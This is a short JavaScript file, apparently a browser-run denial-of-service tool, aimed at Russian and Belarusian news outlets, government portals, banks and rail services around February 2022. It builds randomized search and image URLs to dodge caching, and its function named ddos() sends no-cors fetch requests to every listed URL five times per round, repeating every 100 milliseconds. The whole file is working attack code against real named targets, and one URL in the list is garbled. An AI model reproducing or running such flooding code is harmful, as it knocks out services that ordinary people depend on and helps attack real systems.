function random_pages(first_text, second_text, arr){ 
    for (let i = 0; i < 100; i++) { 
        arr.push(`${first_text}${Math.floor(Math.random() * 100000)}${second_text}`) 
    } 
} 
 
let interfax_arr = [] 
random_pages('https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/0/95/', '.jpg', interfax_arr) 
random_pages('https://www.interfax.ru/search/?sw=', '', interfax_arr) 
let tvzvezda_arr = [] 
random_pages('https://tvzvezda.ru/search/?q=', '', tvzvezda_arr) 
random_pages('https://tvzvezda.ru/news/', '-bASJI.html', tvzvezda_arr) 
random_pages('https://tvzvezda.ru/news/', '-CLvF1.html', tvzvezda_arr) 
random_pages('https://tvzvezda.ru/news/', '-GLCqm.html', tvzvezda_arr) 
random_pages('https://tvzvezda.ru/news/', '-fa5qw.html', tvzvezda_arr) 
random_pages('https://tvzvezda.ru/news/', '-6goyE.html', tvzvezda_arr) 
let portal_arr = [] 
random_pages('https://portal.gov.by/i/portalgovby/images/home/service1_', '.png', portal_arr) 
let bel_arr = [] 
random_pages('https://president.gov.by/ru/search_results?start=0&end=1646043415&query=', '', bel_arr) 
 
 
let sites = [[ 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/0/95/756459023488950.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/5/73/756457078896735.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/0/58/756456912627580.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/0/10/756456545596100.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/2/25/756456124662252.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/9/23/756455782518239.jpg', 
    'https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/5/09/756241028138095.jpg', 
    'https://pro.rbc.ru/news/60c0e6079a79477adecbf205?utm_source=rbc.ru&utm_medium=inhouse_media&utm_campaign=inarticle_desktop_article_body&utm_content=60c0e6079a79477adecbf205', 
    'https://www.rbc.ru/economics/23/02/2022/621555049a7947e1b06873b0?', 
    'https://www.rbc.ru/finances/23/02/2022/6215ecb39a7947080e4a282d?', 
    'https://www.rbc.ru/finances/24/02/2022/6216abbb9a79473a54d65aed?', 
    'https://www.rbc.ru/finances/24/02/2022/62173e4b9a7947703f1aa359?', 
    'https://www.rbc.ru/finances/24/02/2022/62176e7b9a79470cf8482a5b?', 
    'https://www.rbc.ru/finances/27/02/2022/621a68789a794737dade0c51?from=column_2', 
    'https://rbk.ru/', 
    'https://www.rbc.ru/newspaper/', 
], 
[ 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/u700.jpg', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/o700.jpg', 
    'https://www.interfax.ru/russia/825092', 
    'https://www.interfax.ru/world/825105', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/gs700.jpg', 
    'https://www.interfax.ru/business/825098', 
    'https://www.interfax.ru/business/825088', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/21/oo700.jpg', 
    'https://www.interfax.ru/business/825076', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/cb700.jpg', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/mb700.jpg', 
    'https://www.interfax.ru/world/825070', 
    'https://www.interfax.ru/ftproot/textphotos/2022/02/28/nor700.jpg', 
    'https://www.interfax.ru/business/825067', 
    'https://www.interfax.ru/', 
    'https://group.interfax.ru/', 
    'https://www.interfax-russia.ru/', 
    'https://www.interfax.ru/russia/' 
], 
[ 
    'https://yandex.ua/', 
    'https://yandex.ru/', 
    'https://yandex.by/', 
    'https://president.gov.by/en', 
    'https://president.gov.by/ru', 
    'https://president.gov.by/be', 
    'https://president.gov.by/events/2022/02-2022/27-02-2022/image-thumb__38323__working_week_gallery_top/6976~-~media--521a83d4--query.jpg', 
    'https://president.gov.by/ru/events/golosovanie-na-respublikanskom-referendume-po-izmeneniyam-i-dopolneniyam-v-konstituciyu-belarusi', 
    'https://president.gov.by/events/2022/02-2022/27-02-2022/vazhnoye/image-thumb__38358__main_banner-narrow/4002-1~-~media--a496dc81--query.jpg',
    'https://president.gov.by/ru/events/golosovanie-na-respublikanskom-referendume-po-izmeneniyam-i-dopolneniyam-v-konstituciyu-belarusi?openVideo=true', 
    'https://president.gov.by/ru/events/poseshchenie-respublikanskih-sorevnovaniy-sredi-yunoshey-i-molodezhi-po-biatlonu-i-lyzhnym-gonkam?openVideo=true', 
    'https://president.gov.by/ru/events/poseshchenie-minskogo-nauchno-prakticheskogo-centra-hirurgii-transplantologii-i-gematologii?openVideo=true', 
    'https://president.gov.by/ru/president', 
    'https://president.gov.by/ru/events', 
    'https://president.gov.by/ru/documents', 
    'https://president.gov.by/ru/belarus', 
    'https://president.gov.by/ru/gosudarstvo', 
    'https://president.gov.by/content-pages/gosudarstvo/image-thumb__22688__block-right-left/2.jpg', 
    'https://president.gov.by/ru/gosudarstvo/constitution', 
    'https://president.gov.by/ru/gosudarstvo/ustrojstvo/zakonodatelnaja', 
    'https://president.gov.by/ru/gosudarstvo/ustrojstvo/sudebnaya', 
    'https://president.gov.by/ru/gosudarstvo/ustrojstvo/ispolnitelnaja', 
    'https://president.gov.by/_default_upload_bucket/image-thumb__28188__block-right-left/230262-09.jpg', 
    'https://president.gov.by/ru/gosudarstvo/nagrady' 
], 
[ 
    'https://portal.gov.by/', 
    'https://portal.gov.by/PortalGovBy/faces/wcnav_defaultSelection?_afrLoop=292053278224873&_afrWindowMode=0&_afrWindowId=null', 
    'https://portal.gov.by/PortalGovBy/faces/oracle/webcenter/portalapp/pages/info/physical.jspx', 
    'https://portal.gov.by/i/portalgovby/images/home/service1_19012015.png', 
    'https://portal.gov.by/PortalGovBy/faces/oracle/webcenter/portalapp/pages/main/news.jspx', 
    'https://portal.gov.by/i/portalgovby/images/news/epeu.jpg', 
 
], 
[ 
    'https://smotrim.ru/', 
    'https://smotrim.ru/brand/60948?utm_source=internal&utm_medium=main&utm_campaign=main-stories-link', 
    'https://smotrim.ru/brand/21385?utm_source=internal&utm_medium=main&utm_campaign=main-stories-link', 
    'https://smotrim.ru/live/channel/2961?utm_source=internal&utm_medium=main&utm_campaign=main-stories-link', 
    'https://smotrim.ru/article/2682947?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/article/2682925?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/article/2682863?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/article/2682832?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/article/2682798?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/video/2388017?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/video/2388015?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/video/2388006?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/video/2388001?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/video/2388003?utm_source=internal&utm_medium=main&utm_campaign=main-theme', 
    'https://smotrim.ru/vesti?utm_source=internal&utm_medium=menu-group&utm_campaign=menu-main', 
    'https://smotrim.ru/?utm_source=internal&utm_medium=menu-group&utm_campaign=menu-main', 
    'https://smotrim.ru/radio?utm_source=internal&utm_medium=menu-group&utm_campaign=menu-main', 
    'https://smotrim.ru/channels?utm_source=internal&utm_medium=menu-group&utm_campaign=menu-main', 
    'https://smotrim.ru/cinema?utm_source=internal&utm_medium=menu-group&utm_campaign=menu-main' 
], 
[ 
    'http://customs.gov.ru/', 
    'https://www.uralkali.com/ru/', 
    'https://www.eurosib.ru/', 
    'https://www.kommersant.ru/', 
    'https://sputnik.by/20220228/ukrainskaya-delegatsiya-priletela-na-peregovory-v-belarus-1060885702.html', 
    'https://sputnik.by/event_situacija_v_Donbasse/', 
    'https://sputnik.by/20220228/dollar-bolshe-3-rubley-kak-banki-reagiruyut-na-proiskhodyaschee-1060901044.html', 
    'https://sputnik.by/20220228/stavka-refinansirovaniya-povyshaetsya-v-belarusi-1060898461.html', 
    'https://sputnik.by/202president.gov.by/20228/tsik-nazval-chislo-progolosovavshikh-za-izmeneniya-v-konstitutsiyu-1060891988.html', 
    'https://sputnik.by/20220228/spetsoperatsiya-v-donbasse-chto-izvestno-k-etomu-chasu-1060886466.html', 
    'https://sputnik.by/20220228/turetskaya-aviakompaniya-otmenila-reysy-minsk-stambul-na-blizhayshie-dni-1060895587.html', 
    'https://sputnik.by/20220228/ploschadka-dlya-rossiysko-ukrainskikh-peregovorov-podgotovlena---mid-belarusi-1060886132.html', 
    'https://sputnik.by/20220228/genotsid-nad-kotorym-smeetsya-evropa-1060888207.html', 
    'https://sputnik.by/20220227/zapad-sozrel-dlya-adskikh-sanktsiy-protiv-rossii-kazhetsya-1060859080.html', 
    'https://sputnik.by/20220228/zhiteli-kieva-mogut-besprepyatstvenno-pokinut-gorod---minoborony-rf---1060891483.html', 
    'https://sputnik.by/20220228/tsik-oglasil-rezultaty-referenduma-po-izmeneniyam-konstitutsii-1060883869.html', 
    'https://sputnik.by/20220228/bezopasnost-i-ekonomicheskiy-suverenitet-soyuznogo-gosudarstva-belarusi-i-rossii-1060853340.html', 
    'https://sputnik.by/20220228/ne-spali-vsyu-noch-medinskiy-nazval-vremya-nachala-peregovorov---video-1060896156.html', 
    'https://sputnik.by/20220224/karta-granits-dnr-i-lnr--infografika-1060723042.html', 
    'https://sputnik.by/20220228/zhiteli-ukrainy-begut-v-strany-evropy-situaciya-na-granice-foto-1060894054.html', 
    'https://sputnik.by/20220228/bolee-800-chelovek-pribyli-v-belarus-iz-ukrainy-s-nachala-spetsoperatsii-1060898925.html', 
    'https://cdnn11.img.sputnik.by/img/07e6/02/16/1060644109_0:1:3071:2048_295x0_80_0_0_1300f2a61ad20858e7123875254bb21d.jpg.webp', 
    'https://cdnn11.img.sputnik.by/img/07e6/02/19/1060772522_0:0:1800:1200_295x0_80_0_0_bb99aa52b9193cbb4e58d2272e904b54.jpg.webp', 
    'https://cdnn11.img.sputnik.by/img/07e6/02/1c/1060890545_91:0:3163:2048_295x0_80_0_0_ae48832d390aeac035891461f184d2a8.jpg.webp', 
    'https://cdnn11.img.sputnik.by/img/101567/93/1015679334_0:0:5184:3456_295x0_80_0_0_4621b3227c4351ee1428d6888ae1df8d.jpg.webp', 
    'https://sputnik.by/20220228/kalendar-sportivnykh-meropriyatiy-prodolzhaet-razvalivatsya-1060892563.html', 
    'https://sputnik.by/20220228/zhitel-dokshits-rasskazal-kakovo-byt-taksistom-v-gorode-v-7-tysyach-chelovek-1060890809.html' 
], 
[ 
    'https://tvzvezda.ru/', 
    'https://mcdn.tvzvezda.ru/storage/news_other_images/2022/02/28/b8490a5039544293a48ff2304a8d8ad2.thumbnail_360.jpg', 
    'https://tvzvezda.ru/news/20222281133-fa5qw.html', 
    'https://tvzvezda.ru/news/20222281021-6goyE.html', 
    'https://tvzvezda.ru/news/20222281010-8nSyU.html', 
    'https://tvzvezda.ru/news/20222281024-mxtbI.html', 
    'https://tvzvezda.ru/news/20222261049-bASJI.html', 
    'https://tvzvezda.ru/news/2022226413-8vSKA.html', 
    'https://tvzvezda.ru/news/20222251627-CLvF1.html', 
    'https://tvzvezda.ru/news/20222251611-HmKWZ.html', 
    'https://tvzvezda.ru/news/20222261049-bASJI.html', 
    'https://tvzvezda.ru/news/2022226413-8vSKA.html', 
    'https://tvzvezda.ru/news/20222251627-CLvF1.html', 
    'https://tvzvezda.ru/news/20222272230-GLCqm.html', 
    'https://mcdn.tvzvezda.ru/storage/news_other_images/2022/02/27/50436578010047d798f1c9555d74b8be.thumbnail_360.jpg' 
], 
[ 
    'https://ria.ru/lenta/', 
    'https://www.rbc.ru/', 
    'https://www.rt.com/', 
    'https://vsoloviev.ru/', 
    'https://www.1tv.ru/', 
    'https://www.vesti.ru/', 
    'https://online.sberbank.ru', 
    'https://sberbank.ru/', 
    'https://zakupki.gov.ru/', 
    'https://www.gosuslugi.ru/', 
    'https://er.ru/', 
    'https://www.rzd.ru/', 
    'https://rzdlog.ru/', 
    'https://vgtrk.ru/', 
    'https://www.interfax.ru/', 
    'https://www.mos.ru/uslugi', 
    'http://government.ru/', 
    'https://mil.ru/', 
    'https://www.nalog.gov.ru'
], 
interfax_arr, 
tvzvezda_arr, 
portal_arr, 
bel_arr 
] 
 
let p = document.querySelector('.index') 
let index = 0 
 
async function get(url){ 
    let res = await fetch(url, { 
        method: 'GET', 
        mode: 'no-cors' 
    }) 
    return res.json() 
} 
 
function ddos(){
    sites.forEach(site=>{ 
        for (let i = 0; i < 5; i++) { 
            site.forEach(page=>{ 
                get(page) 
                index++ 
            }) 
        } 
        if (sites.indexOf(site) == sites.length-1) { 
            p.innerHTML = index 
            setTimeout(()=>{ 
                ddos() 
            }, 100) 
        } 
    }) 
} 
 
ddos()
